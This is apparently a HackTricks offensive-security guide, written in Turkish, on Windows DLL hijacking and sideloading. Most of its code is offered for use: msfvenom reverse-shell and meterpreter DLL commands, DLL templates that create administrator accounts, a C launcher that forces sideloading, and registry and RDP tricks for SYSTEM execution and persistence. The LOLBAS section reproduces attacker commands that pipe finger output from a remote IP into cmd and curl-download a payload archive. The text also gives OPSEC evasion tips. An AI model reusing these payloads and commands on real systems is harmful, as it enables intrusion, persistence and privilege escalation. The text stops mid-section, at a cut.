# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle code execution, persistence ve daha nadiren privilege escalation için kullanılır. Buradaki odak escalation olsa da, hijacking yöntemi hedeflere göre genelde aynıdır.

### Yaygın Teknikler

Bir uygulamanın DLL yükleme stratejisine bağlı olarak farklı etkinlikte birden fazla yöntem kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir tane ile değiştirmek; isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru olandan önce aranacak bir arama yoluna yerleştirerek uygulamanın arama deseninden faydalanmak.
3. **Phantom DLL Hijacking**: Uygulamanın yükleyeceğini düşündüğü, aslında mevcut olmayan bir gerekli DLL için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'e yönlendirmek için %PATH% veya .exe.manifest / .exe.local dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: WinSxS dizininde meşru DLL'i kötü amaçlı bir muadili ile değiştirmek; genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i, kopyalanmış uygulama ile birlikte kullanıcı tarafından kontrol edilen bir dizine yerleştirmek; Binary Proxy Execution tekniklerine benzer.

> [!TIP]
> HTML staging, AES-CTR konfigürasyonları ve .NET implantlarını DLL sideloading üzerine katmanlayacak adım adım bir zincir için alttaki workflow'u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dll'leri Bulma

Bir sistem içinde eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırıp **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity** gösterin:

![](<../../../images/image (153).png>)

Eğer genel olarak **missing dlls** arıyorsanız, bunu birkaç **saniye** çalışır durumda bırakın.  
Belirli bir yürütülebilir dosya içinde **missing dll** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlamalı, çalıştırmalı ve olay yakalamayı durdurmalısınız.

## Exploiting Missing Dlls

Privilege escalation elde etmek için en iyi şansımız, bir privilege process'in yüklemeye çalışacağı bir dll'i, o dll'in aranacağı yerlerden birine yazabilmektir. Bu nedenle, dll'in orijinal dll'in bulunduğu klasörden önce arandığı bir klasöre dll yazabiliyor olabiliriz (nadir bir durum), veya dll'in aranacağı bir klasöre yazma imkânımız olur ve orijinal dll herhangi bir klasörde mevcut değildir.

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde DLL'lerin nasıl yüklendiğini detaylı olarak bulabilirsiniz.

Windows uygulamaları, önceden belirlenmiş bir dizi arama yolunu takip ederek DLL'leri arar ve belirli bir sıraya uyar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilip orijinal DLL'den önce yüklenmesini sağladığında ortaya çıkar. Bunu önlemek için uygulamanın ihtiyaç duyduğu DLL'lere mutlak yollarla referans vermesi sağlanabilir.

32-bit sistemlerdeki DLL arama sırasını aşağıda görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir fonksiyon yoktur, fakat aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt anahtarıyla belirtilen uygulamaya özel yolu içermediğine dikkat edin. **App Paths** anahtarı DLL arama yolu hesaplanırken kullanılmaz.

Bu, SafeDllSearchMode etkin iken varsayılan arama sırasıdır. Devre dışı bırakıldığında, geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan olarak etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.

Son olarak, bir dll yalnızca adıyla değil mutlak yol belirtilerek de yüklenebilir. Bu durumda o dll sadece belirtilen yolda aranır (dll'in herhangi bir bağımlılığı varsa, onlar adla yüklendiği gibi aranacaktır).

Arama sırasını değiştirebilecek başka yollar da vardır ama burada onları açıklamayacağım.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin ileri düzey bir yolu, ntdll’in native API'leri ile süreci yaratırken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin sağlanarak, bir hedef süreç bir DLL'i adla çözümlerken (mutlak yol kullanmadan ve safe loading flag'leri kullanılmadan) bu dizinden kötü amaçlı bir DLL'in yüklenmesi zorlanabilir.

Temel fikir
- RtlCreateProcessParametersEx ile process parameters oluşturun ve dropper/unpacker'ınızın bulunduğu dizin gibi kontrolünüzdeki bir klasöre işaret eden özel bir DllPath sağlayın.
- RtlCreateUserProcess ile süreci oluşturun. Hedef binary bir DLL'i adla çözdüğünde, loader çözümleme sırasında sağlanan bu DllPath'e bakacak ve malicious DLL hedef EXE ile aynı konumda olmasa bile güvenilir şekilde sideloading yapılmasını sağlayacaktır.

Notlar/sınırlamalar
- Bu, oluşturulan child process'i etkiler; SetDllDirectory'den farklı olarak sadece mevcut process'i etkilemez.
- Hedef, bir DLL'i adla import etmeli veya LoadLibrary ile adla yüklemelidir (mutlak yol kullanılmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalıdır).
- KnownDLLs ve hardcoded mutlak yollar kaçırılamaz. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Tam C örneği: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Kötü amaçlı bir xmllite.dll (gerekli fonksiyonları export eden veya gerçek olana proxy yapan) DllPath dizininize koyun.
- Yukarıdaki teknikle isminden xmllite.dll arayacağı bilinen imzalı bir binary başlatın. The loader sağlanan DllPath üzerinden importu çözer ve DLL’inizi sideloads eder.

Bu teknikin gerçek ortamda multi-stage sideloading chains oluşturmak için kullanıldığı gözlemlenmiştir: ilk launcher bir yardımcı DLL bırakır, bu DLL daha sonra custom DllPath ile saldırganın DLL’inin staging directory'den yüklenmesini zorlamak için Microsoft-signed, hijackable bir binary spawn eder.


#### Exceptions on dll search order from Windows docs

Windows dokümantasyonunda standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- Bir **DLL that shares its name with one already loaded in memory** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine bir yönlendirme ve manifest kontrolü yapar; ardından bellekte zaten olan DLL’e varsayar. **Bu durumda, sistem DLL için bir arama gerçekleştirmez**.
- DLL mevcut Windows sürümü için bir **known DLL** olarak tanınıyorsa, sistem kendi known DLL sürümünü ve bağlı olduğu DLL’leri kullanacaktır; arama sürecini **devre dışı bırakır**. Bu known DLL’lerin listesi kayıt defterinde **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** anahtarında tutulur.
- Eğer bir **DLL’in bağımlılıkları** varsa, bu bağımlı DLL’lerin aranması, başlangıç DLL’i tam yol ile tanımlanmış olsa bile yalnızca **module names** ile belirtilmiş gibi gerçekleştirilir.

### Yetki Yükseltme

**Gereksinimler**:

- Farklı yetkilerle (horizontal or lateral movement) çalışan veya çalışacak bir süreci tespit edin; bu süreç **bir DLL’den yoksun** olmalıdır.
- **DLL**’in **aranacağı** herhangi bir **dizinde** yazma erişiminizin olduğundan emin olun. Bu konum executable’ın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak yetkili bir executable’ın bir DLL eksik olması gariptir** ve system path klasöründe yazma izinlerine sahip olmak **daha da gariptir** (varsayılan olarak sahip olamazsınız). Ancak yanlış yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri sağlıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC’yi bypass etmek** olsa da, orada kullanabileceğiniz Windows sürümü için bir **PoC** of a Dll hijaking bulabilirsiniz (muhtemelen sadece yazma izinleriniz olan klasörün yolunu değiştirerek).

Not: Bir klasördeki izinlerinizi **check your permissions in a folder** şekilde şu komutla kontrol edebilirsiniz:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol et**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir yürütülebilir dosyanın imports'unu ve bir dll'in exports'unu şununla kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Yazma izninizin olduğu bir **System Path klasöründe** **Dll Hijacking'i suistimal ederek ayrıcalıkları yükseltme** hakkında tam rehber için bakınız:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sistem PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.

### Örnek

Eğer istismar edilebilecek bir senaryo bulursanız, bunu başarıyla kullanabilmek için en önemli şeylerden biri, çalıştırılabilir dosyanın ondan ithal edeceği tüm fonksiyonları en azından dışa aktar( export )an bir dll oluşturmaktır. Her durumda, Dll Hijacking'in [Medium Integrity seviyesinden High'a **(UAC atlayarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity'den SYSTEM'e**](../index.html#from-high-integrity-to-system) yükseltme için kullanışlı olduğunu unutmayın. Bu çalışmada, çalıştırma amaçlı dll hijacking üzerine odaklanmış bir örnek olarak **geçerli bir dll nasıl oluşturulur** örneğini şu adreste bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, bir sonraki bölümde **şablon** olarak veya **gerekmeyen fonksiyonları da dışa aktaran bir dll oluşturmak** için faydalı olabilecek bazı **temel dll kodları** bulabilirsiniz.

## **Dll Oluşturma ve Derleme**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklendiğinde **kötü amaçlı kodunuzu çalıştırabilen** ama aynı zamanda **beklenen işlevleri sunmak** ve **tüm çağrıları gerçek kütüphaneye ileterek beklenen şekilde çalışmak** için tasarlanmış bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla aslında proxify etmek istediğiniz executable'ı belirleyip kütüphaneyi seçebilir ve **proxified bir dll üretebilir** ya da **Dll'i belirleyip proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) edin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Çoğu durumda derlediğiniz Dll'in victim process tarafından yüklenecek birkaç fonksiyonu **export etmesi** gerektiğini unutmayın; bu fonksiyonlar yoksa **binary onları yükleyemeyecek** ve **exploit başarısız olacak**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>İş parçacığı girişine sahip alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe başlangıçta tahmin edilebilir, dil-özel bir localization DLL'i aramaya devam eder; bu DLL hijack edilerek arbitrary code execution ve persistence sağlanabilir.

Önemli bilgiler
- Deneme yolu (mevcut sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Eğer OneCore yolunda saldırgan-kontrollü, yazılabilir bir DLL varsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Exportlara gerek yoktur.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yolun yükleme denemesini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- Basit bir hijack konuşma/vurgulama yapar. Sessiz kalmak için bağlandığınızda Narrator thread'lerini sıralayın, ana thread'i açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve `SuspendThread` ile durdurun; kendi thread'inizde devam edin. Tam kod için PoC'a bakın.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notlar
- `%windir%\System32` altına yazma ve HKLM değerlerini değiştirme admin hakları gerektirir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde olabilir; export'lara gerek yok.

## Vaka Çalışması: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Ayrıcalık Yükseltme

Bu vaka Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) içinde **Phantom DLL Hijacking**'i gösterir; izlenen olarak **CVE-2025-1729**.

### Zafiyet Detayları

- **Bileşen**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Dizin İzinleri**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Arama Davranışı**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Uygulaması

Bir saldırgan aynı dizine kötü amaçlı bir `hostfxr.dll` stub'u yerleştirebilir; eksik DLL'i suistimal ederek kullanıcının bağlamında kod yürütmesi elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Normal bir kullanıcı olarak, `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturumu açıksa, zararlı DLL yönetici oturumunda medium integrity düzeyinde çalışır.
4. medium integrity'den SYSTEM privileges'a yükseltmek için standart UAC bypass techniques zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri sıklıkla MSI tabanlı droppers'ı DLL side-loading ile eşleştirerek payload'ları güvenilir, imzalı bir process altında çalıştırırlar.

Zincir özeti
- Kullanıcı MSI'yi indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) sessizce bir CustomAction çalışır ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper aynı dizine meşru, imzalı bir EXE ve zararlı bir DLL yazar (örnek çift: Avast tarafından imzalanmış wsc_proxy.exe + saldırgan kontrollü wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası önce çalışma dizininden wsc.dll'i yükler ve imzalı bir üst süreç altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
- Yürütülebilir dosyaları veya VBScript çalıştıran girdilere bakın. Şüpheli örnek desen: LaunchApplication'ın arka planda gömülü bir dosyayı çalıştırması.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
- Yönetici çıktısı: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- VBScript CustomAction tarafından birleştirilen ve şifresi çözülen birden fazla küçük parçaya bakın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe ile pratik sideloading
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: meşru imzalı host (Avast). İşlem, dizininden adıyla wsc.dll'i yüklemeye çalışır.
- wsc.dll: attacker DLL. Eğer özel exports gerekmezse, DllMain yeterli olabilir; aksi takdirde, bir proxy DLL oluşturun ve gereken exports'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- İhracat gereksinimleri için, payload'ınızı da çalıştıran bir proxying framework (örn., DLLirant/Spartacus) kullanarak bir forwarding DLL üretin.

- Bu teknik host binary'nin DLL ad çözümlemesine dayanır. Eğer host mutlak yollar veya safe loading flag'leri (örn., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export set seçimi sırasında dikkate alınmalıdır.

## İmzalı triadlar + şifrelenmiş payload'lar (ShadowPad vaka incelemesi)

Check Point, Ink Dragon'ın ShadowPad'i çekirdek payload'ı diskte şifreli tutarken meşru yazılımlarla karışmak için nasıl **üç dosyalı triad** kullandığını açıkladı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi satıcılar suistimal edilir (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar yürütülebilir dosyanın adını Windows ikili dosyası gibi gösterecek şekilde değiştirir (ör. `conhost.exe`), ancak Authenticode imzası geçerli kalır.
2. **Malicious loader DLL** – EXE'nin yanında beklenen bir adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuskasyon yapılmış bir MFC binary'sidir; tek görevi şifrelenmiş blob'u bulmak, çözmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizinde `<name>.tmp` olarak depolanır. Çözülen payload hafızaya eşlendikten sonra loader TMP dosyasını adli kanıtı yok etmek için siler.

Tradecraft notları:

* İmzalı EXE'yi yeniden adlandırmak (PE başlığında orijinal `OriginalFileName`'i koruyarak) onun bir Windows ikili dosyası gibi görünmesini sağlar ancak satıcı imzasını korur; bu yüzden Ink Dragon'ın gerçekten AMD/NVIDIA yardımcı programları olan `conhost.exe` görünümlü ikilileri bırakma alışkanlığını taklit edin.
* Yürütülebilir dosya güvendiği için, çoğu allowlisting kontrolü kötü amaçlı DLL'in sadece yanında bulunmasını yeterli görür. Loader DLL'i özelleştirmeye odaklanın; imzalı üst program genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad'in şifre çözücü programı, TMP blob'un loader'ın yanında ve yazılabilir olmasını bekler, böylece eşlemeden sonra dosyayı sıfırlayabilir. Payload yüklenene kadar dizini yazılabilir tutun; hafızada olduktan sonra TMP dosyası OPSEC için güvenle silinebilir.

### LOLBAS stager + staged archive sideloading zinciri (finger → tar/curl → WMI)

Operatörler, DLL sideloading'i LOLBAS ile eşleştirir, böylece disk üzerinde tek özel artefakt güvendiği EXE'nin yanındaki kötü amaçlı DLL olur:

- **Remote command loader (Finger):** Gizli PowerShell `cmd.exe /c` başlatır, bir Finger sunucusundan komut çeker ve bunları `cmd`'ye yönlendirir:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırır, operatörlerin ikinci aşamayı sunucu tarafında değiştirmesine izin verir.

- **Built-in download/extract:** Zararsız bir uzantıya sahip bir arşiv indirin, açın ve sideload hedefini ile DLL'i rastgele bir `%LocalAppData%` klasörü altında hazırlayın:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ilerlemeyi gizler ve yönlendirmaları takip eder; `tar -xf` Windows'un yerleşik tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI üzerinden başlatın, böylece telemetri, birlikte bulunan DLL'i yüklerken CIM tarafından oluşturulmuş bir süreç gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Yerel DLL'leri tercih eden ikililerle çalışır (ör., `intelbq.exe`, `nearby_share.exe`); payload (ör., Remcos) güvenilir ad altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` birlikte göründüğünde `forfiles` için alarm oluşturun; yönetici scriptleri dışında nadirdir.


## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yeni bir Lotus Blossom saldırısı, NSIS ile paketlenmiş bir dropper'ı teslim etmek için güvenilir bir güncelleme zincirini suistimal etti; bu dropper bir DLL sideload'ı ve tamamen hafızada çalışan payload'lar hazırladı.

İşlem akışı
